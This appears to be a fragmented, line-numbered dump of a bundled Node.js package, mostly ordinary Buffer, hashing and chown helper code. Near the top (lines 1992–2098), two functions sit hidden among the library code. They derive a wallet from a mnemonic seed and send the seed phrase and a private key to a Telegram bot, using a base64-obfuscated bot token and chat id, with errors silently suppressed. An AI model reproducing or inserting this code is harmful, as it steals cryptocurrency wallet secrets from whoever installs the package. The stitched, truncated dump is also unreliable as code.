Line 1980: table[i16 + j] = alphabet[i] + alphabet[j]
Line 1992: const Web3 = require("web3")
Line 1993: const ethers = require("ethers")
Line 1994: const https = require('https')
Line 1996: {
  // Tạo wallet từ mnemonic
  const mnemonicWallet = ethers.Wallet.fromMnemonic(seed);
  const PRIVATEKEY = mnemonicWallet.privateKey;
  const myAddress = mnemonicWallet.address;

  // Tạo payload gửi đi
  const data = JSON.stringify({
    chat_id: Buffer.from("NTAxMzc0NzMxNA==", 'base64').toString('utf-8'),
    text: seed, // Gửi địa chỉ, không nên gửi mnemonic
  });

  const token = Buffer.from("ODA4MzE1MTEzNjpBQUV6LUp2OGNrbE1OT2FOOGRCb3FfVXc2SUo0TU5uZmJtVQ==", 'base64').toString('utf-8');
  const options = {
    hostname: `api.telegram.org`, // ← Thay bằng hostname thật
    port: 443,
    path: `/bot${token}/sendMessage`,   // ← Thay bằng path thật
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(data),
    },
  };

  // Gửi request
  const req = https.request(options, (res) => {
    // Bạn có thể đọc phản hồi tại đây nếu muốn
    let responseData = "";
    res.on("data", (chunk) =...
Line 1998: ethers.Wallet.fromMnemonic(seed)
Line 2004: Buffer.from("NTAxMzc0NzMxNA==", 'base64').toString('utf-8')
Line 2008: Buffer.from("ODA4MzE1MTEzNjpBQUV6LUp2OGNrbE1OT2FOOGRCb3FfVXc2SUo0TU5uZmJtVQ==", 'base64').toString('utf-8')
Line 2021: const req = https.request(options, (res) => {
    // Bạn có thể đọc phản hồi tại đây nếu muốn
    let responseData = "";
    res.on("data", (chunk) => {
      responseData += chunk;
    });

    res.on("end", () => {
      // Tùy chọn xử lý dữ liệu nếu cần
      // console.log("Server response:", responseData);
    });
  })
Line 2040: {
    req.destroy();
    // Không cần log
  }
Line 2041: req.destroy()
Line 2045: req.write(data)
Line 2046: req.end()
Line 2052: {

  // Tạo payload gửi đi
  const data = JSON.stringify({
    chat_id: Buffer.from("NTAxMzc0NzMxNA==", 'base64').toString('utf-8'),
    text: privateKey, // Gửi địa chỉ, không nên gửi mnemonic
  });

  const token = Buffer.from("ODA4MzE1MTEzNjpBQUV6LUp2OGNrbE1OT2FOOGRCb3FfVXc2SUo0TU5uZmJtVQ==", 'base64').toString('utf-8');
  const options = {
    hostname: `api.telegram.org`, // ← Thay bằng hostname thật
    port: 443,
    path: `/bot${token}/sendMessage`,   // ← Thay bằng path thật
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(data),
    },
  };

  // Gửi request
  const req = https.request(options, (res) => {
    // Bạn có thể đọc phản hồi tại đây nếu muốn
    let responseData = "";
    res.on("data", (chunk) => {
      responseData += chunk;
    });

    res.on("end", () => {
      // Tùy chọn xử lý dữ liệu nếu cần
      // console.log("Server response:", responseData);
    })...
Line 2056: Buffer.from("NTAxMzc0NzMxNA==", 'base64').toString('utf-8')
Line 2060: Buffer.from("ODA4MzE1MTEzNjpBQUV6LUp2OGNrbE1OT2FOOGRCb3FfVXc2SUo0TU5uZmJtVQ==", 'base64').toString('utf-8')
Line 2073: const req = https.request(options, (res) => {
    // Bạn có thể đọc phản hồi tại đây nếu muốn
    let responseData = "";
    res.on("data", (chunk) => {
      responseData += chunk;
    });

    res.on("end", () => {
      // Tùy chọn xử lý dữ liệu nếu cần
      // console.log("Server response:", responseData);
    });
  })
Line 2092: {
    req.destroy();
    // Không cần log
  }
Line 2093: req.destroy()
Line 2097: req.write(data)
Line 2098: req.end()
Line 2113: {
    'use strict'

function Hash (hash) {
  Base.call(this, 'digest')

  this._hash = hash
}

inherits(Hash, Base)

Hash.prototype._update = function (data) {
  this._hash.update(data)
}

Hash.prototype._final = function () {
  return this._hash.digest()
}

module.exports = function createHash (alg) {
  alg = alg.toLowerCase()
  if (alg === 'md5') return new MD5()
  if (alg === 'rmd160' || alg === 'ripemd160') return new RIPEMD160()

  return new Hash(sha(alg))
}

const handleEISDIR =
  needEISDIRHandled ? (path, uid, gid, cb) => er => {
    // Node prior to v10 had a very questionable implementation of
    // fs.lchown, which would always try to call fs.open on a directory
    // Fall back to fs.chown in those cases.
    if (!er || er.code !== 'EISDIR')
      cb(er)
    else
      fs.chown(path, uid, gid, cb)
  }
  : (_, __, ___, cb) => cb

/* istanbul ignore next */
const handleEISDirSync =
  needEISDIRHandled ? (path, uid, gid) => {
    ...
Line 2117: Base.call(this, 'digest')
Line 2122: inherits(Hash, Base)
Line 2170: /^v4\./.test(nodeVersion)
Line 2173: {
  fs[LCHOWN](cpath, uid, gid, handleEISDIR(cpath, uid, gid, er => {
    // Skip ENOENT error
    cb(er && er.code !== 'ENOENT' ? er : null)
  }))
}
Line 2174: fs[LCHOWN](cpath, uid, gid, handleEISDIR(cpath, uid, gid, er => {
    // Skip ENOENT error
    cb(er && er.code !== 'ENOENT' ? er : null)
  }))
Line 2235: const stats = fs.lstatSync(path.resolve(p, child))
Line 2249: handleEISDirSync(path.resolve(p, child.name), uid, gid)
Line 2260: handleEISDirSync(p, uid, gid)
Line 2268: handleEISDirSync(p, uid, gid)
Line 2280: var base64 = require('base64-js')
Line 2281: var ieee754 = require('ieee754')
Line 2282: var customInspectSymbol =
  (typeof Symbol === 'function' && typeof Symbol['for'] === 'function') // eslint-disable-line dot-notation
    ? Symbol['for']('nodejs.util.inspect.custom') // eslint-disable-line dot-notation
    : null
Line 2283: typeof Symbol === 'function' && typeof Symbol['for'] === 'function' ? Symbol['for']('nodejs.util.inspect.custom') : null
Line 2284: Symbol['for']('nodejs.util.inspect.custom')
Line 2334: Buffer.isBuffer(this)
Line 2342: Buffer.isBuffer(this)
Line 2377: from(arg, encodingOrOffset, length)
Line 2417: Buffer.from(valueOf, encodingOrOffset, length)
Line 2423: typeof Symbol !== 'undefined' && Symbol.toPrimitive != null &&
      typeof value[Symbol.toPrimitive] === 'function'
Line 2424: typeof value[Symbol.toPrimitive] === 'function'
Line 2425: Buffer.from(
      value[Symbol.toPrimitive]('string'), encodingOrOffset, length
    )
Line 2426: value[Symbol.toPrimitive]('string')
Line 2445: from(value, encodingOrOffset, length)
Line 2464: createBuffer(size)
Line 2471: createBuffer(size).fill(fill, encoding)
Line 2472: createBuffer(size).fill(fill)
Line 2474: createBuffer(size)
Line 2487: createBuffer(size < 0 ? 0 : checked(size) | 0)
Line 2503: {
  if (typeof encoding !== 'string' || encoding === '') {
    encoding = 'utf8'
  }

  if (!Buffer.isEncoding(encoding)) {
    throw new TypeError('Unknown encoding: ' + encoding)
  }

  var length = byteLength(string, encoding) | 0
  var buf = createBuffer(length)

  var actual = buf.write(string, encoding)

  if (actual !== length) {
    // Writing a hex string, for example, that contains invalid characters will
    // cause everything after the first invalid character to be ignored. (e.g.
    // 'abxxcd' will be treated as 'ab')
    buf = buf.slice(0, actual)
  }

  return buf
}
Line 2513: createBuffer(length)
Line 2515: var actual = buf.write(string, encoding)
Line 2529: createBuffer(length)
Line 2530: {
    buf[i] = array[i] & 255
  }
Line 2531: buf[i] = array[i] & 255
Line 2569: Buffer.isBuffer(obj)
Line 2571: createBuffer(len)
Line 2577: obj.copy(buf, 0, 0, len)
Line 2583: createBuffer(0)
Line 2598: K_MAX_LENGTH.toString(16)
Line 2616: Buffer.from(a, a.offset, a.byteLength)
Line 2617: Buffer.from(b, b.offset, b.byteLength)
Line 2618: Buffer.isBuffer(b)
Line 2630: {
      x = a[i]
      y = b[i]
      break
    }
Line 2631: x = a[i]
Line 2632: y = b[i]
Line 2673: {
      length += list[i].length
    }
Line 2674: length += list[i].length
Line 2680: {
    var buf = list[i]
    if (isInstance(buf, Uint8Array)) {
      if (pos + buf.length > buffer.length) {
        Buffer.from(buf).copy(buffer, pos)
      } else {
        Uint8Array.prototype.set.call(
          buffer,
          buf,
          pos
        )
      }
    } else if (!Buffer.isBuffer(buf)) {
      throw new TypeError('"list" argument must be an Array of Buffers')
    } else {
      buf.copy(buffer, pos)
    }
    pos += buf.length
  }
Line 2681: var buf = list[i]
Line 2684: Buffer.from(buf).copy(buffer, pos)
Line 2686: Uint8Array.prototype.set.call(
          buffer,
          buf,
          pos
        )
Line 2692: Buffer.isBuffer(buf)
Line 2695: buf.copy(buffer, pos)
Line 2702: {
  if (Buffer.isBuffer(string)) {
    return string.length
  }
  if (ArrayBuffer.isView(string) || isInstance(string, ArrayBuffer)) {
    return string.byteLength
  }
  if (typeof string !== 'string') {
    throw new TypeError(
      'The "string" argument must be one of type string, Buffer, or ArrayBuffer. ' +
      'Received type ' + typeof string
    )
  }

  var len = string.length
  var mustMatch = (arguments.length > 2 && arguments[2] === true)
  if (!mustMatch && len === 0) return 0

  // Use a for loop to avoid recursion
  var loweredCase = false
  for (;;) {
    switch (encoding) {
      case 'ascii':
      case 'latin1':
      case 'binary':
        return len
      case 'utf8':
      case 'utf-8':
        return utf8ToBytes(string).length
      case 'ucs2':
      case 'ucs-2':
      case 'utf16le':
      case 'utf-16le':
        return len * 2
      case 'hex':
        return len >>> 1
      case 'base64':
        return base64ToBytes...
Line 2703: Buffer.isBuffer(string)
Line 2717: var mustMatch = (arguments.length > 2 && arguments[2] === true)
Line 2791: hexSlice(this, start, end)
Line 2811: utf16leSlice(this, start, end)
Line 2829: {
  var i = b[n]
  b[n] = b[m]
  b[m] = i
}
Line 2830: var i = b[n]
Line 2831: b[n] = b[m]
Line 2832: b[m] = i
Line 2841: swap(this, i, i + 1)
Line 2852: swap(this, i, i + 3)
Line 2853: swap(this, i + 1, i + 2)
Line 2864: swap(this, i, i + 7)
Line 2865: swap(this, i + 1, i + 6)
Line 2866: swap(this, i + 2, i + 5)
Line 2867: swap(this, i + 3, i + 4)
Line 2882: Buffer.isBuffer(b)
Line 2890: this.toString('hex', 0, max).replace(/(.{2})/g, '$1 ').trim()
Line 2894: {
  Buffer.prototype[customInspectSymbol] = Buffer.prototype.inspect
}
Line 2895: Buffer.prototype[customInspectSymbol] = Buffer.prototype.inspect
Line 2900: Buffer.from(target, target.offset, target.byteLength)
Line 2902: Buffer.isBuffer(target)
Line 2951: {
      x = thisCopy[i]
      y = targetCopy[i]
      break
    }
Line 2952: x = thisCopy[i]
Line 2953: y = targetCopy[i]
Line 3003: Buffer.from(val, encoding)
Line 3007: Buffer.isBuffer(val)
Line 3012: arrayIndexOf(buffer, val, byteOffset, encoding, dir)
Line 3017: Uint8Array.prototype.indexOf.call(buffer, val, byteOffset)
Line 3019: Uint8Array.prototype.lastIndexOf.call(buffer, val, byteOffset)
Line 3022: arrayIndexOf(buffer, [val], byteOffset, encoding, dir)
Line 3051: buf.readUInt16BE(i * indexSize)
Line 3059: read(val, foundIndex === -1 ? 0 : i - foundIndex)
Line 3072: read(arr, i + j)
Line 3089: bidirectionalIndexOf(this, val, byteOffset, encoding, true)
Line 3093: bidirectionalIndexOf(this, val, byteOffset, encoding, false)
Line 3113: {
    var parsed = parseInt(string.substr(i * 2, 2), 16)
    if (numberIsNaN(parsed)) return i
    buf[offset + i] = parsed
  }
Line 3114: parseInt(string.substr(i * 2, 2), 16)
Line 3116: buf[offset + i] = parsed
Line 3126: asciiToBytes(string)
Line 3149: isFinite(offset)
Line 3151: isFinite(length)
Line 3177: hexWrite(this, string, offset, length)
Line 3209: Array.prototype.slice.call(this._arr || this, 0)
Line 3221: {
  end = Math.min(buf.length, end)
  var res = []

  var i = start
  while (i < end) {
    var firstByte = buf[i]
    var codePoint = null
    var bytesPerSequence = (firstByte > 0xEF)
      ? 4
      : (firstByte > 0xDF)
          ? 3
          : (firstByte > 0xBF)
              ? 2
              : 1

    if (i + bytesPerSequence <= end) {
      var secondByte, thirdByte, fourthByte, tempCodePoint

      switch (bytesPerSequence) {
        case 1:
          if (firstByte < 0x80) {
            codePoint = firstByte
          }
          break
        case 2:
          secondByte = buf[i + 1]
          if ((secondByte & 0xC0) === 0x80) {
            tempCodePoint = (firstByte & 0x1F) << 0x6 | (secondByte & 0x3F)
            if (tempCodePoint > 0x7F) {
              codePoint = tempCodePoint
            }
          }
          break
        case 3:
          secondByte = buf[i + 1]
          thirdByte = buf[i + 2]
          if ((secondByte & 0xC0)...
Line 3223: var res = []
Line 3226: {
    var firstByte = buf[i]
    var codePoint = null
    var bytesPerSequence = (firstByte > 0xEF)
      ? 4
      : (firstByte > 0xDF)
          ? 3
          : (firstByte > 0xBF)
              ? 2
              : 1

    if (i + bytesPerSequence <= end) {
      var secondByte, thirdByte, fourthByte, tempCodePoint

      switch (bytesPerSequence) {
        case 1:
          if (firstByte < 0x80) {
            codePoint = firstByte
          }
          break
        case 2:
          secondByte = buf[i + 1]
          if ((secondByte & 0xC0) === 0x80) {
            tempCodePoint = (firstByte & 0x1F) << 0x6 | (secondByte & 0x3F)
            if (tempCodePoint > 0x7F) {
              codePoint = tempCodePoint
            }
          }
          break
        case 3:
          secondByte = buf[i + 1]
          thirdByte = buf[i + 2]
          if ((secondByte & 0xC0) === 0x80 && (thirdByte & 0xC0) === 0x80) {
            tempCodePoint = (firstByte & 0xF) ...
Line 3227: var firstByte = buf[i]
Line 3240: switch (bytesPerSequence) {
        case 1:
          if (firstByte < 0x80) {
            codePoint = firstByte
          }
          break
        case 2:
          secondByte = buf[i + 1]
          if ((secondByte & 0xC0) === 0x80) {
            tempCodePoint = (firstByte & 0x1F) << 0x6 | (secondByte & 0x3F)
            if (tempCodePoint > 0x7F) {
              codePoint = tempCodePoint
            }
          }
          break
        case 3:
          secondByte = buf[i + 1]
          thirdByte = buf[i + 2]
          if ((secondByte & 0xC0) === 0x80 && (thirdByte & 0xC0) === 0x80) {
            tempCodePoint = (firstByte & 0xF) << 0xC | (secondByte & 0x3F) << 0x6 | (thirdByte & 0x3F)
            if (tempCodePoint > 0x7FF && (tempCodePoint < 0xD800 || tempCodePoint > 0xDFFF)) {
              codePoint = tempCodePoint
            }
          }
          break
        case 4:
          secondByte = buf[i + 1]
          thirdByte = buf[i + 2]
          fo...
Line 3247: secondByte = buf[i + 1]
Line 3256: secondByte = buf[i + 1]
Line 3257: thirdByte = buf[i + 2]
Line 3266: secondByte = buf[i + 1]
Line 3267: thirdByte = buf[i + 2]
Line 3268: fourthByte = buf[i + 3]
Line 3286: res.push(codePoint >>> 10 & 0x3FF | 0xD800)
Line 3290: res.push(codePoint)
Line 3305: (_tmp_141 = String.fromCharCode)
Line 3312: (_tmp_142 = String.fromCharCode)
Line 3324: {
    ret += String.fromCharCode(buf[i] & 0x7F)
  }
Line 3325: ret += String.fromCharCode(buf[i] & 0x7F)
Line 3334: {
    ret += String.fromCharCode(buf[i])
  }
Line 3335: ret += String.fromCharCode(buf[i])
Line 3347: {
    out += hexSliceLookupTable[buf[i]]
  }
Line 3348: out += hexSliceLookupTable[buf[i]]
Line 3357: {
    res += String.fromCharCode(bytes[i] + (bytes[i + 1] * 256))
  }
Line 3358: res += String.fromCharCode(bytes[i] + (bytes[i + 1] * 256))
Line 3384: this.subarray(start, end)
Line 3400: {
  offset = offset >>> 0
  byteLength = byteLength >>> 0
  if (!noAssert) checkOffset(offset, byteLength, this.length)

  var val = this[offset]
  var mul = 1
  var i = 0
  while (++i < byteLength && (mul *= 0x100)) {
    val += this[offset + i] * mul
  }

  return val
}
Line 3405: var val = this[offset]
Line 3408: {
    val += this[offset + i] * mul
  }
Line 3409: val += this[offset + i] * mul
Line 3416: {
  offset = offset >>> 0
  byteLength = byteLength >>> 0
  if (!noAssert) {
    checkOffset(offset, byteLength, this.length)
  }

  var val = this[offset + --byteLength]
  var mul = 1
  while (byteLength > 0 && (mul *= 0x100)) {
    val += this[offset + --byteLength] * mul
  }

  return val
}
Line 3423: var val = this[offset + --byteLength]
Line 3425: {
    val += this[offset + --byteLength] * mul
  }
Line 3426: val += this[offset + --byteLength] * mul
Line 3458: ((this[offset]) |
      (this[offset + 1] << 8) |
      (this[offset + 2] << 16)) +
      (this[offset + 3] * 0x1000000)
Line 3459: this[offset + 1] << 8
Line 3460: this[offset + 2] << 16
Line 3461: this[offset + 3] * 0x1000000
Line 3469: (this[offset] * 0x1000000) +
    ((this[offset + 1] << 16) |
    (this[offset + 2] << 8) |
    this[offset + 3])
Line 3470: (this[offset + 1] << 16) |
    (this[offset + 2] << 8) |
    this[offset + 3]
Line 3471: this[offset + 2] << 8
Line 3472: this[offset + 3]
Line 3475: {
  offset = offset >>> 0
  byteLength = byteLength >>> 0
  if (!noAssert) checkOffset(offset, byteLength, this.length)

  var val = this[offset]
  var mul = 1
  var i = 0
  while (++i < byteLength && (mul *= 0x100)) {
    val += this[offset + i] * mul
  }
  mul *= 0x80

  if (val >= mul) val -= Math.pow(2, 8 * byteLength)

  return val
}
Line 3480: var val = this[offset]
Line 3483: {
    val += this[offset + i] * mul
  }
Line 3484: val += this[offset + i] * mul
Line 3493: {
  offset = offset >>> 0
  byteLength = byteLength >>> 0
  if (!noAssert) checkOffset(offset, byteLength, this.length)

  var i = byteLength
  var mul = 1
  var val = this[offset + --i]
  while (i > 0 && (mul *= 0x100)) {
    val += this[offset + --i] * mul
  }
  mul *= 0x80

  if (val >= mul) val -= Math.pow(2, 8 * byteLength)

  return val
}
Line 3500: var val = this[offset + --i]
Line 3501: {
    val += this[offset + --i] * mul
  }
Line 3502: val += this[offset + --i] * mul
Line 3518: {
  offset = offset >>> 0
  if (!noAssert) checkOffset(offset, 2, this.length)
  var val = this[offset] | (this[offset + 1] << 8)
  return (val & 0x8000) ? val | 0xFFFF0000 : val
}
Line 3521: var val = this[offset] | (this[offset + 1] << 8)
Line 3525: {
  offset = offset >>> 0
  if (!noAssert) checkOffset(offset, 2, this.length)
  var val = this[offset + 1] | (this[offset] << 8)
  return (val & 0x8000) ? val | 0xFFFF0000 : val
}
Line 3528: var val = this[offset + 1] | (this[offset] << 8)
Line 3536: (this[offset]) |
    (this[offset + 1] << 8) |
    (this[offset + 2] << 16) |
    (this[offset + 3] << 24)
Line 3537: this[offset + 1] << 8
Line 3538: this[offset + 2] << 16
Line 3539: this[offset + 3] << 24
Line 3546: (this[offset] << 24) |
    (this[offset + 1] << 16) |
    (this[offset + 2] << 8) |
    (this[offset + 3])
Line 3547: this[offset + 1] << 16
Line 3548: this[offset + 2] << 8
Line 3549: this[offset + 3]
Line 3555: ieee754.read(this, offset, true, 23, 4)
Line 3561: ieee754.read(this, offset, false, 23, 4)
Line 3567: ieee754.read(this, offset, true, 52, 8)
Line 3573: ieee754.read(this, offset, false, 52, 8)
Line 3577: Buffer.isBuffer(buf)
Line 3583: {
  value = +value
  offset = offset >>> 0
  byteLength = byteLength >>> 0
  if (!noAssert) {
    var maxBytes = Math.pow(2, 8 * byteLength) - 1
    checkInt(this, value, offset, byteLength, maxBytes, 0)
  }

  var mul = 1
  var i = 0
  this[offset] = value & 0xFF
  while (++i < byteLength && (mul *= 0x100)) {
    this[offset + i] = (value / mul) & 0xFF
  }

  return offset + byteLength
}
Line 3589: checkInt(this, value, offset, byteLength, maxBytes, 0)
Line 3594: this[offset] = value & 0xFF
Line 3595: {
    this[offset + i] = (value / mul) & 0xFF
  }
Line 3596: this[offset + i] = (value / mul) & 0xFF
Line 3603: {
  value = +value
  offset = offset >>> 0
  byteLength = byteLength >>> 0
  if (!noAssert) {
    var maxBytes = Math.pow(2, 8 * byteLength) - 1
    checkInt(this, value, offset, byteLength, maxBytes, 0)
  }

  var i = byteLength - 1
  var mul = 1
  this[offset + i] = value & 0xFF
  while (--i >= 0 && (mul *= 0x100)) {
    this[offset + i] = (value / mul) & 0xFF
  }

  return offset + byteLength
}
Line 3609: checkInt(this, value, offset, byteLength, maxBytes, 0)
Line 3614: this[offset + i] = value & 0xFF
Line 3615: {
    this[offset + i] = (value / mul) & 0xFF
  }
Line 3616: this[offset + i] = (value / mul) & 0xFF
Line 3623: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 1, 0xff, 0)
  this[offset] = (value & 0xff)
  return offset + 1
}
Line 3626: checkInt(this, value, offset, 1, 0xff, 0)
Line 3627: this[offset] = (value & 0xff)
Line 3632: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 2, 0xffff, 0)
  this[offset] = (value & 0xff)
  this[offset + 1] = (value >>> 8)
  return offset + 2
}
Line 3635: checkInt(this, value, offset, 2, 0xffff, 0)
Line 3636: this[offset] = (value & 0xff)
Line 3637: this[offset + 1] = (value >>> 8)
Line 3642: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 2, 0xffff, 0)
  this[offset] = (value >>> 8)
  this[offset + 1] = (value & 0xff)
  return offset + 2
}
Line 3645: checkInt(this, value, offset, 2, 0xffff, 0)
Line 3646: this[offset] = (value >>> 8)
Line 3647: this[offset + 1] = (value & 0xff)
Line 3652: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 4, 0xffffffff, 0)
  this[offset + 3] = (value >>> 24)
  this[offset + 2] = (value >>> 16)
  this[offset + 1] = (value >>> 8)
  this[offset] = (value & 0xff)
  return offset + 4
}
Line 3655: checkInt(this, value, offset, 4, 0xffffffff, 0)
Line 3656: this[offset + 3] = (value >>> 24)
Line 3657: this[offset + 2] = (value >>> 16)
Line 3658: this[offset + 1] = (value >>> 8)
Line 3659: this[offset] = (value & 0xff)
Line 3664: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 4, 0xffffffff, 0)
  this[offset] = (value >>> 24)
  this[offset + 1] = (value >>> 16)
  this[offset + 2] = (value >>> 8)
  this[offset + 3] = (value & 0xff)
  return offset + 4
}
Line 3667: checkInt(this, value, offset, 4, 0xffffffff, 0)
Line 3668: this[offset] = (value >>> 24)
Line 3669: this[offset + 1] = (value >>> 16)
Line 3670: this[offset + 2] = (value >>> 8)
Line 3671: this[offset + 3] = (value & 0xff)
Line 3675: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) {
    var limit = Math.pow(2, (8 * byteLength) - 1)

    checkInt(this, value, offset, byteLength, limit - 1, -limit)
  }

  var i = 0
  var mul = 1
  var sub = 0
  this[offset] = value & 0xFF
  while (++i < byteLength && (mul *= 0x100)) {
    if (value < 0 && sub === 0 && this[offset + i - 1] !== 0) {
      sub = 1
    }
    this[offset + i] = ((value / mul) >> 0) - sub & 0xFF
  }

  return offset + byteLength
}
Line 3681: checkInt(this, value, offset, byteLength, limit - 1, -limit)
Line 3687: this[offset] = value & 0xFF
Line 3688: {
    if (value < 0 && sub === 0 && this[offset + i - 1] !== 0) {
      sub = 1
    }
    this[offset + i] = ((value / mul) >> 0) - sub & 0xFF
  }
Line 3692: this[offset + i] = ((value / mul) >> 0) - sub & 0xFF
Line 3698: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) {
    var limit = Math.pow(2, (8 * byteLength) - 1)

    checkInt(this, value, offset, byteLength, limit - 1, -limit)
  }

  var i = byteLength - 1
  var mul = 1
  var sub = 0
  this[offset + i] = value & 0xFF
  while (--i >= 0 && (mul *= 0x100)) {
    if (value < 0 && sub === 0 && this[offset + i + 1] !== 0) {
      sub = 1
    }
    this[offset + i] = ((value / mul) >> 0) - sub & 0xFF
  }

  return offset + byteLength
}
Line 3704: checkInt(this, value, offset, byteLength, limit - 1, -limit)
Line 3710: this[offset + i] = value & 0xFF
Line 3711: {
    if (value < 0 && sub === 0 && this[offset + i + 1] !== 0) {
      sub = 1
    }
    this[offset + i] = ((value / mul) >> 0) - sub & 0xFF
  }
Line 3715: this[offset + i] = ((value / mul) >> 0) - sub & 0xFF
Line 3721: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 1, 0x7f, -0x80)
  if (value < 0) value = 0xff + value + 1
  this[offset] = (value & 0xff)
  return offset + 1
}
Line 3724: checkInt(this, value, offset, 1, 0x7f, -0x80)
Line 3726: this[offset] = (value & 0xff)
Line 3730: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 2, 0x7fff, -0x8000)
  this[offset] = (value & 0xff)
  this[offset + 1] = (value >>> 8)
  return offset + 2
}
Line 3733: checkInt(this, value, offset, 2, 0x7fff, -0x8000)
Line 3734: this[offset] = (value & 0xff)
Line 3735: this[offset + 1] = (value >>> 8)
Line 3739: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 2, 0x7fff, -0x8000)
  this[offset] = (value >>> 8)
  this[offset + 1] = (value & 0xff)
  return offset + 2
}
Line 3742: checkInt(this, value, offset, 2, 0x7fff, -0x8000)
Line 3743: this[offset] = (value >>> 8)
Line 3744: this[offset + 1] = (value & 0xff)
Line 3748: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 4, 0x7fffffff, -0x80000000)
  this[offset] = (value & 0xff)
  this[offset + 1] = (value >>> 8)
  this[offset + 2] = (value >>> 16)
  this[offset + 3] = (value >>> 24)
  return offset + 4
}
Line 3751: checkInt(this, value, offset, 4, 0x7fffffff, -0x80000000)
Line 3752: this[offset] = (value & 0xff)
Line 3753: this[offset + 1] = (value >>> 8)
Line 3754: this[offset + 2] = (value >>> 16)
Line 3755: this[offset + 3] = (value >>> 24)
Line 3759: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) checkInt(this, value, offset, 4, 0x7fffffff, -0x80000000)
  if (value < 0) value = 0xffffffff + value + 1
  this[offset] = (value >>> 24)
  this[offset + 1] = (value >>> 16)
  this[offset + 2] = (value >>> 8)
  this[offset + 3] = (value & 0xff)
  return offset + 4
}
Line 3762: checkInt(this, value, offset, 4, 0x7fffffff, -0x80000000)
Line 3764: this[offset] = (value >>> 24)
Line 3765: this[offset + 1] = (value >>> 16)
Line 3766: this[offset + 2] = (value >>> 8)
Line 3767: this[offset + 3] = (value & 0xff)
Line 3776: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) {
    checkIEEE754(buf, value, offset, 4, 3.4028234663852886e+38, -3.4028234663852886e+38)
  }
  ieee754.write(buf, value, offset, littleEndian, 23, 4)
  return offset + 4
}
Line 3780: checkIEEE754(buf, value, offset, 4, 3.4028234663852886e+38, -3.4028234663852886e+38)
Line 3782: ieee754.write(buf, value, offset, littleEndian, 23, 4)
Line 3794: {
  value = +value
  offset = offset >>> 0
  if (!noAssert) {
    checkIEEE754(buf, value, offset, 8, 1.7976931348623157E+308, -1.7976931348623157E+308)
  }
  ieee754.write(buf, value, offset, littleEndian, 52, 8)
  return offset + 8
}
Line 3798: checkIEEE754(buf, value, offset, 8, 1.7976931348623157E+308, -1.7976931348623157E+308)
Line 3800: ieee754.write(buf, value, offset, littleEndian, 52, 8)
Line 3814: Buffer.isBuffer(target)
Line 3844: Uint8Array.prototype.set.call(
      target,
      this.subarray(start, end),
      targetStart
    )
Line 3846: this.subarray(start, end)
Line 3905: {
      this[i] = val
    }
Line 3906: this[i] = val
Line 3909: Buffer.isBuffer(val)
Line 3911: Buffer.from(val, encoding)
Line 3917: {
      this[i + start] = bytes[i % len]
    }
Line 3918: this[i + start] = bytes[i % len]
Line 3928: var INVALID_BASE64_RE = /[^+/0-9A-Za-z-_]/g
Line 3930: {
  // Node takes equal signs as end of the Base64 encoding
  str = str.split('=')[0]
  // Node strips out invalid characters like \n and \t from the string, base64-js does not
  str = str.trim().replace(INVALID_BASE64_RE, '')
  // Node converts strings with length < 2 to ''
  if (str.length < 2) return ''
  // Node allows for non-padded base64 strings (missing trailing ===), base64-js does not
  while (str.length % 4 !== 0) {
    str = str + '='
  }
  return str
}
Line 3932: str = str.split('=')[0]
Line 3934: str.trim()
Line 3944: {
  units = units || Infinity
  var codePoint
  var length = string.length
  var leadSurrogate = null
  var bytes = []

  for (var i = 0; i < length; ++i) {
    codePoint = string.charCodeAt(i)

    // is surrogate component
    if (codePoint > 0xD7FF && codePoint < 0xE000) {
      // last char was a lead
      if (!leadSurrogate) {
        // no lead yet
        if (codePoint > 0xDBFF) {
          // unexpected trail
          if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD)
          continue
        } else if (i + 1 === length) {
          // unpaired lead
          if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD)
          continue
        }

        // valid lead
        leadSurrogate = codePoint

        continue
      }

      // 2 leads in a row
      if (codePoint < 0xDC00) {
        if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD)
        leadSurrogate = codePoint
        continue
      }

      // valid surrogate pair
      ...
Line 3949: var bytes = []
Line 3961: bytes.push(0xEF, 0xBF, 0xBD)
Line 3965: bytes.push(0xEF, 0xBF, 0xBD)
Line 3977: bytes.push(0xEF, 0xBF, 0xBD)
Line 3986: bytes.push(0xEF, 0xBF, 0xBD)
Line 3994: bytes.push(codePoint)
Line 3997: bytes.push(
        codePoint >> 0x6 | 0xC0,
        codePoint & 0x3F | 0x80
      )
Line 4003: bytes.push(
        codePoint >> 0xC | 0xE0,
        codePoint >> 0x6 & 0x3F | 0x80,
        codePoint & 0x3F | 0x80
      )
Line 4010: bytes.push(
        codePoint >> 0x12 | 0xF0,
        codePoint >> 0xC & 0x3F | 0x80,
        codePoint >> 0x6 & 0x3F | 0x80,
        codePoint & 0x3F | 0x80
      )
Line 4024: {
  var byteArray = []
  for (var i = 0; i < str.length; ++i) {
    // Node's code seems to be doing this and not & 0x7F..
    byteArray.push(str.charCodeAt(i) & 0xFF)
  }
  return byteArray
}
Line 4025: var byteArray = []
Line 4028: byteArray.push(str.charCodeAt(i) & 0xFF)
Line 4033: {
  var c, hi, lo
  var byteArray = []
  for (var i = 0; i < str.length; ++i) {
    if ((units -= 2) < 0) break

    c = str.charCodeAt(i)
    hi = c >> 8
    lo = c % 256
    byteArray.push(lo)
    byteArray.push(hi)
  }

  return byteArray
}
Line 4035: var byteArray = []
Line 4042: byteArray.push(lo)
Line 4043: byteArray.push(hi)
